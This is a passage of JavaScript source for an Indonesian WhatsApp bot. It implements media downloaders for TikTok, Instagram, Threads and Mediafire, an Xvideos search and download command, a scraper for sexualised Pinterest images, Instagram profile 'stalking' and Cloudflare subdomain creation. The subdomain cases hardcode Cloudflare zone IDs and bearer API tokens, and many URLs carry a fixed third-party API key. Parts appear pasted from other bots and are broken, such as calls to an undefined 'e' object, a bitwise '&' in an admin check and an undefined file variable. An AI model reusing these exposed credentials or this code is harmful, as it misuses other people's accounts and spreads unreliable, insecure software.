		break
		case 'ytmp3': {
			if (!text) return rzxReply(`*Example :*\n\n*Ytmp3 Link*`)
			rzxReply(resbug)
			downloadMp3(text)
		}
		break
		case 'threads': {
			if (!text) return rzxReply(`*Anda Perlu Memberikan URL Video, Postingan, Gambar Threads Apa Pun*`)
			rzxReply(resbug)
			const createImage = async (url) => {
				const {
					imageMessage
				} = await generateWAMessageContent({
					image: {
						url
					}
				}, {
					upload: rzx.waUploadToServer
				});
				return imageMessage;
			};
			const createVideo = async (url) => {
				const {
					videoMessage
				} = await generateWAMessageContent({
					video: {
						url
					}
				}, {
					upload: rzx.waUploadToServer
				});
				return videoMessage;
			};
			let res;
			try {
				res = await fetch(`https://api.betabotz.eu.org/api/download/threads?url=${text}?igshid=NTc4MTIwNjQ2YQ==&apikey=GetsuzoZhiro`);
			} catch (error) {
				return rzxReply(`Terjadi kesalahan: ${error.message}`);
			}
			let api_response = await res.json();
			if (!api_response || !api_response.result) {
				return rzxReply(`Tidak Ada Video Atau Gambar Yang Ditemukan Atau Respon Dari Api Tidak Valid.`);
			}
			const imageUrls = api_response.result.image_urls;
			const videoUrls = api_response.result.video_urls;
			const mediaCards = [];
			if (videoUrls && videoUrls.length > 0) {
				for (const videoUrl of videoUrls) {
					mediaCards.push({
						header: proto.Message.InteractiveMessage.Header.fromObject({
							title: 'VIDEO',
							hasMediaAttachment: true,
							videoMessage: await createVideo(videoUrl)
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
							buttons: [] // Hapus semua tombol
						})
					});
				}
			}
			if (imageUrls && imageUrls.length > 0) {
				for (const imageUrl of imageUrls) {
					mediaCards.push({
						header: proto.Message.InteractiveMessage.Header.fromObject({
							title: 'IMAGE',
							hasMediaAttachment: true,
							imageMessage: await createImage(imageUrl)
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
							buttons: [] // Hapus semua tombol
						})
					});
				}
			}

			const msg = generateWAMessageFromContent(m.chat, {
				viewOnceMessage: {
					message: {
						messageContextInfo: {
							deviceListMetadata: {},
							deviceListMetadataVersion: 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.fromObject({
							body: proto.Message.InteractiveMessage.Body.fromObject({
								text: `> Threads Media`
							}),
							carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
								cards: mediaCards
							})
						})
					}
				}
			}, {});

			await rzx.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			});
		}
		break
		case 'instagram':
		case 'insta': {
			if (!text) return rzxReply(`*Anda Perlu Memberikan URL Video, Postingan, Reel, Gambar Instagram Apa Pun*`);
			rzxReply(resbug);
			let api = await fetch(`https://api.betabotz.eu.org/api/download/igdowloader?url=${text}&apikey=GetsuzoZhiro`)
			let betaku = await api.json();
			for (let i of betaku.message) {
				rzx.sendFile(m.chat, i._url, 'beta.mp4', `${gris}[I N S T A G R A M]${gris}\n\n©𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🐉`, Zets)
			}
		}
		break
		case 'igeror': {
			if (!text) return rzxReply(`*Anda Perlu Memberikan URL Video, Postingan, Reel, Gambar Instagram Apa Pun*`);
			rzxReply(resbug);

			const createImage = async (url) => {
				const {
					imageMessage
				} = await generateWAMessageContent({
					image: {
						url
					}
				}, {
					upload: rzx.waUploadToServer
				});
				return imageMessage;
			};

			const createVideo = async (url) => {
				const {
					videoMessage
				} = await generateWAMessageContent({
					video: {
						url
					}
				}, {
					upload: rzx.waUploadToServer
				});
				return videoMessage;
			};

			let res;
			try {
				res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`);
			} catch (error) {
				return rzxReply(`An error occurred: ${error.message}`);
			}

			let api_response = await res.json();
			if (!api_response || !api_response.data) {
				return rzxReply(`No Video Or Image Found Or Invalid Response From API.`);
			}

			const mediaArray = api_response.data;
			const mediaCards = [];

			for (const mediaData of mediaArray) {
				const mediaType = mediaData.type;
				const mediaURL = mediaData.url_download;

				if (mediaType === 'video') {
					mediaCards.push({
						header: proto.Message.InteractiveMessage.Header.fromObject({
							title: 'HERE IS THE VIDEO',
							hasMediaAttachment: true,
							videoMessage: await createVideo(mediaURL)
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
							buttons: [] // Hapus semua tombol
						})
					});
				} else if (mediaType === 'image') {
					mediaCards.push({
						header: proto.Message.InteractiveMessage.Header.fromObject({
							title: 'HERE IS THE IMAGE',
							hasMediaAttachment: true,
							imageMessage: await createImage(mediaURL)
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
							buttons: [] // Hapus semua tombol
						})
					});
				}
			}

			const msg = generateWAMessageFromContent(m.chat, {
				viewOnceMessage: {
					message: {
						messageContextInfo: {
							deviceListMetadata: {},
							deviceListMetadataVersion: 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.fromObject({
							body: proto.Message.InteractiveMessage.Body.fromObject({
								text: `> Instagram Media`
							}),
							carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
								cards: mediaCards
							})
						})
					}
				}
			}, {});

			await rzx.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			});
		}
		break
		case 'play': {
			if (!text) return rzxReply(`*Example :*\n\n*Play Mendua*`)
			rzxReply(resbug);
			let yts = require("youtube-yts")
			let look = await yts(text);
			let convert = look.videos[0];
			const pl = await youtube(convert.url)
			await rzx.sendMessage(m.chat, {
				audio: {
					url: pl.mp3
				},
				fileName: convert.title + '.mp3',
				mimetype: 'audio/mpeg',
				contextInfo: {
					externalAdReply: {
						title: convert.title,
						body: packname,
						thumbnailUrl: convert.image,
						sourceUrl: pl.mp3,
						mediaType: 1,
						mediaUrl: convert.url,
					}
				},
			}, {
				quoted: Zets
			})
		}
		break
		case 'tiktok': {
			if (!text) return rzxReply(`*Example :*\n\n*Tiktokdl Link Url*`);
			if (!text.includes('tiktok.com')) return rzxReply('Url Tidak Mengandung Result Dari Tiktok!');
			rzxReply(resbug);
			try {
				let api = await fetch(`https://api.betabotz.eu.org/api/download/tiktok?url=${encodeURIComponent(text)}&apikey=GetsuzoZhiro`);
				let betaku = await api.json();
				if (!betaku.status) return rzxReply('Gagal mendapatkan data dari API.');
				const {
					title,
					video,
					audio
				} = betaku.result;
				await rzx.sendMessage(m.chat, {
					video: {
						url: video[0]
					},
					caption: `${gris}[ T I K T O K ]${gris}\n\n*› Title :* ${title}`,
					mimetype: 'video/mp4',
				}, {
					quoted: Zets
				});
				// Mengirim tombol untuk unduh audio
				await rzx.sendButtons(m.chat, {
					"body": `\`\`「 ${gris}[ T I K T O K ]${gris} 」\`\`\n\n  *›  UNDUH AUDIO*\n${hiasan}*Title :* ${title}`,
					"footer": "⿻  ⌜ 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🐉 ⌟  ⿻",
					"buttons": [{
						"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
						"id": `ttmp3 ${q}`
					}]
				}, {
					quoted: Zets
				});
			} catch (error) {
				rzxReply('Terjadi Kesalahan Saat Menghubungi API.');
				console.error(error);
			}
		}
		break
		case 'ttmp4':
		case 'ttdl': {
			if (!text) return rzxReply(`*Example :* \n\n*Tiktokdl Link Url*`)
			if (!text.includes('tiktok.com')) return rzxReply('Url Tidak Mengandung Result Dari Tiktok!')
			const hasil = await tiktokDl(text);
			rzxReply(resbug)
			if (hasil.size_nowm) {
				await rzx.sendFileUrl(m.chat, hasil.data[1].url, `${gris}[ T I K T O K ]${gris}\n\n${hiasan}*Author* : ${hasil.author.nickname}\n${hiasan}*Capiton* : ${hasil.title}`, Zets)
				await rzx.sendButtons(m.chat, {
					"body": `\`\`「 ${gris}[ T I K T O K ]${gris} 」\`\`\n\n  *›  UNDUH AUDIO*\n${hiasan}*Author* : ${hasil.author.nickname}`,
					"footer": "⿻  ⌜ 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🐉 ⌟  ⿻",
					"buttons": [{
						"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
						"id": `ttmp3 ${q}`
					}]
				}, {
					quoted: Zets
				})
			} else {
				for (let i = 0; i < hasil.data.length; i++) {
					await rzx.sendFileUrl(m.chat, hasil.data[i].url, `${gris}[ I M A G E ]${gris}`, Zets)
				}
				await rzx.sendButtons(m.chat, {
					"body": `\`\`「 ${gris}[ T I K T O K ]${gris} 」\`\`\n\n  *›  UNDUH AUDIO*\n${hiasan}*Author* : ${hasil.author.nickname}`,
					"footer": "⿻  ⌜ 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🐉 ⌟  ⿻",
					"buttons": [{
						"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
						"id": `ttmp3 ${q}`
					}]
				}, {
					quoted: Zets
				})
			}
		}
		break
		case 'ttmp3': {
			if (!text) return rzxReply(`*Example:*\n\n*Ttmp3 Link Url*`)
			if (!text.includes('tiktok.com')) return rzxReply('Url Tidak Mengandung Result Dari Tiktok!')
			const hasil = await tiktokDl(text);
			rzxReply(resbug)
			await rzx.sendMessage(m.chat, {
				audio: {
					url: hasil.music_info.url
				},
				mimetype: 'audio/mpeg',
				contextInfo: {
					externalAdReply: {
						title: 'TikTok • ' + hasil.author.nickname,
						body: hasil.stats.likes + ' Suka, ' + hasil.stats.comment + ' Komentar. ' + hasil.title,
						previewType: 'PHOTO',
						thumbnailUrl: hasil.cover,
						mediaType: 1,
						renderLargerThumbnail: true,
						sourceUrl: text
					}
				}
			}, {
				quoted: Zets
			});
		}
		break
		case 'xvid': {
			if (!text) return rzxReply(`*Example :*\n\nXvid Japan\n\n_~NOTE~_\nStelah Memasukan Japan Dan Muncul URL, Ketik Ulang, Xvid Sertakan URL Nya\n\nXvid URL`);
			if (!text) return rzxReply('Please provide a search query or a valid Xvideos URL.');
			const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
			try {
				if (isURL) {
					const result = await xvideosdl(text);
					const {
						title,
						url
					} = result.result;
					const response = await fetch(url);
					const buffer = await response.arrayBuffer();
					let msgs = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									body: proto.Message.InteractiveMessage.Body.create({
										text: `Here you go!!\nTitle: ${title}`
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: packname
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										hasMediaAttachment: false,
										...await prepareWAMessageMedia({
											video: Buffer.from(buffer)
										}, {
											upload: rzx.waUploadToServer
										})
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"💦\",\"id\":\""}`
										}],
									}),
									contextInfo: {
										mentionedJid: [m.sender],
										forwardingScore: 999,
										isForwarded: true,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: packname,
											serverMessageId: 143
										}
									}
								})
							}
						}
					}, {
						quoted: m
					})
					await rzx.relayMessage(m.chat, msgs.message, {})
				} else {
					const results = await xvideosSearch(text);
					if (results.length === 0) {
						rzxReply('No search results found for the given query.');
					} else {
						const searchResults = results.map((result, index) => {
							return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
						}).join('\n\n');
						let msgs = generateWAMessageFromContent(m.chat, {
							viewOnceMessage: {
								message: {
									"messageContextInfo": {
										"deviceListMetadata": {},
										"deviceListMetadataVersion": 2
									},
									interactiveMessage: proto.Message.InteractiveMessage.create({
										body: proto.Message.InteractiveMessage.Body.create({
											text: `*Search Results for "${text}":*\n\n${searchResults}`
										}),
										footer: proto.Message.InteractiveMessage.Footer.create({
											text: packname
										}),
										header: proto.Message.InteractiveMessage.Header.create({
											hasMediaAttachment: false,
											...await prepareWAMessageMedia({
												image: fs.readFileSync('./system/image/TheZhiro.jpg')
											}, {
												upload: rzx.waUploadToServer
											})
										}),
										nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
											buttons: [{
												"name": "quick_reply",
												"buttonParamsJson": `{\"display_text\":\"💦\",\"id\":\""}`
											}],
										}),
										contextInfo: {
											mentionedJid: [m.sender],
											forwardingScore: 999,
											isForwarded: true,
											forwardedNewsletterMessageInfo: {
												newsletterJid: global.xchannel.jid,
												newsletterName: packname,
												serverMessageId: 143
											}
										}
									})
								}
							}
						}, {
							quoted: m
						})
						await rzx.relayMessage(m.chat, msgs.message, {})
					}
				}
			} catch (error) {
				console.error(error);
				return rzxReply('Failed To Fetch Xvideos Video Details.');
			}
		};
		break
		case 'cecan': {
			rzxReply(resbug)
			const createImage = async (url) => {
				const {
					imageMessage
				} = await generateWAMessageContent({
					image: {
						url
					}
				}, {
					upload: rzx.waUploadToServer
				});
				return imageMessage;
			};
			async function pinterest(query) {
				let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
				let json = await res.json();
				let data = json.resource_response.data.results;
				if (!data.length)rzxReply(`Query "${query}" not found :/`);
				return data[~~(Math.random() * data.length)].images.orig.url;
			}
			const imageUrls = [];
			for (let i = 0; i < 10; i++) {
				const imageUrl = await pinterest('Tobrut')
				imageUrls.push(imageUrl);
			}
			const cards = await Promise.all(imageUrls.map(async (url, index) => ({
				header: proto.Message.InteractiveMessage.Header.fromObject({
					title: `IMAGE ${index + 1}`,
					hasMediaAttachment: true,
					imageMessage: await createImage(url)
				}),
				nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
					buttons: [] // Hapus semua tombol
				})
			})));
			const msg = generateWAMessageFromContent(m.chat, {
				viewOnceMessage: {
					message: {
						messageContextInfo: {
							deviceListMetadata: {},
							deviceListMetadataVersion: 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.fromObject({
							body: proto.Message.InteractiveMessage.Body.fromObject({
								text: `> Batas 10 Photo`
							}),
							carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
								cards
							})
						})
					}
				}
			}, {});

			await rzx.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			});
		};
		break
		case 'tiktokslide':
		case 'ttslide': {
			if (!text) return rzxReply(`*Example :* \n\n*Tiktokdl Link Url*`)
			if (!text.includes('tiktok.com')) return rzxReply('Url Tidak Mengandung Result Dari Tiktok!')
			rzxReply(resbug)
			try {
				let query = args[0]; // Mendapatkan URL dari args
				if (!query) return rzxReply('Masukkan URL TikTok Terlebih Dahulu.');

				// Memfetch data dari API TikTok Slide
				let res = await fetch(`https://api.betabotz.eu.org/api/download/ttslide?url=${query}&apikey=GetsuzoZhiro`);
				let json = await res.json();

				if (!json.status) return rzxReply('Gagal Mengambil Data, Coba Lagi.');

				let images = json.result.images; // Mengambil list gambar dari hasil
				let title = json.result.title || "TikTok Slide"; // Judul Slide
				let slide = json.result.totalSlide || "Total Slide"; // Judul Slide

				const createImage = async (url) => {
					const {
						imageMessage
					} = await generateWAMessageContent({
						image: {
							url
						}
					}, {
						upload: rzx.waUploadToServer
					});
					return imageMessage;
				};

				const cards = await Promise.all(images.map(async (url, index) => ({
					header: proto.Message.InteractiveMessage.Header.fromObject({
						title: `${gris}IMAGE ${index + 1}${gris}`,
						hasMediaAttachment: true,
						imageMessage: await createImage(url)
					}),
					nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
						buttons: [] // Tidak ada tombol
					})
				})));

				const msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							messageContextInfo: {
								deviceListMetadata: {},
								deviceListMetadataVersion: 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.fromObject({
								body: proto.Message.InteractiveMessage.Body.fromObject({
									text: `> ${gris}[TIKTOK FOTO SLIDE]${gris}\n\n${hiasan}Total Foto : ${slide}\n${hiasan}${title}`
								}),
								carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
									cards
								})
							})
						}
					}
				}, {});

				await rzx.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
				await rzx.sendButtons(m.chat, {
					"body": `\`\`「 ${gris}[ T I K T O K ]${gris} 」\`\`\n\n  *›  UNDUH AUDIO*\n${hiasan}*Author* : ${packname}`,
					"footer": "⿻  ⌜ 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🐉 ⌟  ⿻",
					"buttons": [{
						"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
						"id": `ttmp3 ${q}`
					}]
				}, {
					quoted: Zets
				})
			} catch (err) {
				rzxReply('Terjadi kesalahan, coba lagi nanti.');
				console.error(err);
			}
		}
		break
		case 'mediafire': {
			if (!text) return rzxReply(`*Example :* \n\n*Tiktokdl Link Url*`)
			if (!text.includes('mediafire.com')) return rzxReply('Url Tidak Mengandung Result Dari Mediafire!')
			rzxReply(resbug)
			let api = await fetch(`https://api.betabotz.eu.org/api/download/mediafire?url=${text}&apikey=GetsuzoZhiro`)
			let betaku = await api.json();

			const {
				url,
				url2,
				filename,
				filetype,
				ext,
				upload_date,
				filesizeH,
				filesize
			} = betaku.result

			rzx.sendMessage(m.chat, {
				document: {
					url: url
				},
				caption: `${gris}[M E D I A  F I R E]${gris}\n\n${hiasan}*NAMA : ${filename}*\n${hiasan}*FILETYPE : ${ext}*\n${hiasan}*DATE : ${upload_date}*\n${hiasan}*SIZE : ${filesizeH}*\n\n~©𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🐉~`,
				fileName: filename,
				mimetype: ext
			}, {
				quoted: Zets
			})
		}
		break
		//=================================================//

		// STALKING \\
		//=================================================//
		case "stalkig": {
			rzxReply(resbug)
			await rzx.sendMessage(m.chat, {
				react: {
					text: "⚡",
					key: m.key
				}
			});
			try {
				let query = m.text.slice(8).trim();
				if (query === "") {
					rzxReply("*Example :* \n\n*Stalkig Username IG*");
				} else {
					let {
						data
					} = await axios.get(`https://api.betabotz.eu.org/api/stalk/ig?username=${encodeURIComponent(query)}&apikey=GetsuzoZhiro`);

					if (data.status === true && data.result) {
						let profileInfo = `${gris}[ I N S T A G R A M ]${gris}\n\n*Username : ${data.result.username}*\n*Full Name : ${data.result.fullName}*\n*Bio : ${data.result.bio}*\n*Followers : ${data.result.followers}*\n*Following : ${data.result.following}*\n*Posts : ${data.result.postsCount}*`;
						await rzx.sendMessage(m.chat, {
							image: {
								url: data.result.photoUrl
							},
							caption: profileInfo
						}, {
							quoted: Zets
						});
					} else {
						rzxReply("Terjadi Kesalahan Dalam Pengambilan Data.");
					}
				}
			} catch (error) {
				rzxReply("Terjadi Kesalahan Dalam Koneksi Atau Pengambilan Data.");
			}
		}
break
case 'widih':
case 'wanjay':
case 'nice': 
case 'gg': {
const interaksi = [
  'Sheesh 🥶', 'Merasa Cool Gweh Bejir 😎', 'Waduh Wir 😁', '😎🙏🏻', '𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 Gitu Loch', '🥵🔥', 'Beliau ini 😁', 'Aku mah masih pemula 🛐'
]
const responsif = interaksi[Math.floor(Math.random() * interaksi.length)]
rzxReply(`${responsif}`)
}
break
case 'ppppp': case 'pp': case 'ppp': case 'pppp': case 'p': {
const interaksi = [
  'Ngechat Kok "P", Minimal Salam Deck _-', 'Ha?', 'Apa', 'Oy Apaan', 'Astagfirullah Brother.. Lain Kali Chat Orang Pake Assalamualaikum, jan pake P', 'Minimal Salam 🥵', 'Hoh?', 'assalamualaikum coba🗿'
]
const responsif = interaksi[Math.floor(Math.random() * interaksi.length)]
rzxReply(`${responsif}`)
}
break
case 'euy': case 'cok': case 'cuk': case 'cuy': case 'woe': case 'woi': case 'woy': case 'hlo': case 'oy': case 'oi': case 'phe': case 'haloo': case 'hey': case 'halo': case 'hi': case 'hii': case 'hai': case 'haii': case 'haiii': {
const interaksi = [
  'Halooo😄', 'Yaa?😉', 'Afah? 👁️👄👁️', 'Napa Bro? 🗿☕', 'Haloo,Apa Ada Yang Bisa 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 Bantu? ⚡', 'Oy🗿', 'Apaan🗿', 'Hah?😑', 'Oi😪', 'Ot😴', 'Apa Woi🗿'
]
const responsif = interaksi[Math.floor(Math.random() * interaksi.length)]
rzxReply(`${responsif}`)
}
break
case 'assalamualaikum': {
const interaksi = [
  'Waalaikumsalaam <⁠(⁠￣⁠︶⁠￣⁠)⁠>', 'Waalaikumsalaam Brother', 'Waalaikumsalaam...', 'Waalaikumsalaam :D'
]
const responsif = interaksi[Math.floor(Math.random() * interaksi.length)]
rzxReply(`${responsif}`)
}
break 
case 'reqvps': {
await loading()
rzxReply(`𝘏𝘢𝘺 𝘔𝘦𝘬𝘪 ${pushname} 👋
▭▬▭( *REQUEST VPS* )▭▬▭

Region : 
Os : 
Version : 
Ram : 

⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 *('global.namabot')*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)
}
break 
case 'demote': {
if (!m.isGroup) return rzxReply(mess.group)
if (!(isGroupAdmins || isCreator)) return rzxReply('Males ah 🧢')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rzx.groupParticipantsUpdate(from, [users], 'demote')
}
break 
case 'promote': {
if (!m.isGroup) return rzxReply(mess.group)
if (!(isGroupAdmins & isCreator)) return rzxReply('Males ah 🧢')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rzx.groupParticipantsUpdate(from, [users], 'promote')
}
break 
case 'setppgc': {
if (!isGroup) return rzxReply(msg.group)
if (!isOwner) return rzxReply(msg.owner)
if (/image/g.test(mime)) {
let media = await rzx.downloadAndSaveMediaMessage(qmsg)
await rzx.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(nulll2)
rzxReply("Berhasil Mengganti *Profil* Grup")
} else return rzxReply('dengan mengirim foto')
}
// SUBDO
break
case 'subdomain': {
let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} hostname,ipVps`)
let hostname = t[0];
let ip = t[1];

let sections = [{
title: 'List Subdomain di bawah',
rows: [{
title: 'rafatharofficial.my.id',
description: `Create Subdomain rafatharofficial.my.id`, 
id: `.domain1 ${hostname}|${ip}`
},
{
title: 'digital-market.me', 
description: "Create Subdomin digital-market.me", 
id: `.domain2 ${hostname}|${ip}`
},
{
title: 'sellerpanell-store.xyz',
description: `Create Subdomain sellerpanell-store.xyz`, 
id: `.domain3 ${hostname}|${ip}`
},
{
title: 'mypanell-store.com',
description: `Create Subdomain mypanell-store.com`, 
id: `.domain4 ${hostname}|${ip}`
},
{
title: 'panelstoreku.xyz ',
description: `Create Subdomain panelstoreku.xyz `, 
id: `.domain5 ${hostname}|${ip}`
},
{
title: 'panelanimeku.my.id  ',
description: `Create Subdomain panelanimeku.my.id  `, 
id: `.domain7 ${hostname}|${ip}`
},
{
title: 'turzcloud.tech  ',
description: `Create Subdomain turzcloud.tech  `, 
id: `.domain8 ${hostname}|${ip}`
},
{
title: 'cloudxingyu.me  ',
description: `Create Subdomain cloudxingyu.me  `, 
id: `.domain9 ${hostname}|${ip}`
},
{
title: 'xinyustore.tech',
description: `Create Subdomain xinyustore.tech`, 
id: `.domain11 ${hostname}|${ip}`
},
{
title: 'panelshop.live',
description: `Create Subdomain panel-store.games`, 
id: `.domain12 ${hostname}|${ip}`
},
{
title: 'webhostt.my.id',
description: `Create Subdomain webhostt.my.id`, 
id: `.domain13 ${hostname}|${ip}`
},
{
title: 'fadhostmarketplace.me',
description: `Create Subdomain fadhostmarketplace.me`,
id: `.domain14 ${hostname}|${ip}`
},
{
title: 'fadhost.tech',
description: `Create Subdomain fadhost.tech`, 
id: `.domain15 ${hostname}|${ip}`
},
{
title: 'fadilhosting.my.id',
description: `Create Subdomain fadilhosting.my.id`, 
id: `.domain17 ${hostname}|${ip}`
},
{
title: 'kebutuhanhosting.biz.id',
description: `Create Subdomain kebutuhanhosting.biz.id`, 
id: `.domain18 ${hostname}|${ip}`
},
{
title: 'panelkuu.biz.id',
description: `Create Subdomain panelkuu.biz.id`, 
id: `.domain19 ${hostname}|${ip}`
}]
}]

let listMessage = {
    title: 'Klik Disini!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363297330834513@newsletter',
 newsletterName: 'Powered By e', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: e.decodeJid(e.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Please choose the you subdomain`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${m.sender.split("@")[0]} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/bbd9c5027512cc31f5309.jpg" } }, { upload: e.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await e.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}


break 
case 'domain1': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e13ba8568f6e44ca927569da961d9eb6";
               let apitoken = "bTF2B2fQNe0nJL62gTuGQEbeZCEbOC0FpGWB-ESr";
               let tld = "rafatharofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By e⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/CfbyBQFi0jT8rqjEjRl8vy _*`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain2': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d4a6adffd3dd317753c4401e38cb7949";
               let apitoken = "oMSalNry5ByDu_PBJhTAxNOhQiYKjWQImKKDIhWh";
               let tld = "digital-market.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
